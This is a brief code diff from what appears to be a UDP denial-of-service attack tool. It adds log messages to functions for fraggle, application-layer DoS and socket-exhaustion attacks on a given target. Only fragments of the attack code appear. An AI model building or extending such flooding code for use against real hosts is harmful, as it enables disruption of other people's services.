@@ -78,6 +78,7 @@ void perform_udp_ampl(struct attack_opts_t *opts) {
 }
 
 void perform_udp_fraggle(struct attack_opts_t *opts) {
+	LOG_INFO("Starting UDP fraggle attack to %s", opts->atk_target);
         int sockfd = create_udp_socket();
 
         int enable = 1;
@@ -100,6 +101,7 @@ void perform_udp_fraggle(struct attack_opts_t *opts) {
 }
 
 void perform_udp_app_layer_dos(struct attack_opts_t *opts) {
+	LOG_INFO("Starting UDP App layer dos attack to %s", opts->atk_target);
         int sockfd = create_udp_socket();
         struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);
 
@@ -123,6 +125,7 @@ void perform_udp_app_layer_dos(struct attack_opts_t *opts) {
 }
 
 void perform_udp_socket_exhaustion(struct attack_opts_t *opts) {
+	LOG_INFO("Starting UDP Socket exhaustion attack to %s", opts->atk_target);
         struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);
 
         time_t start = time(NULL);
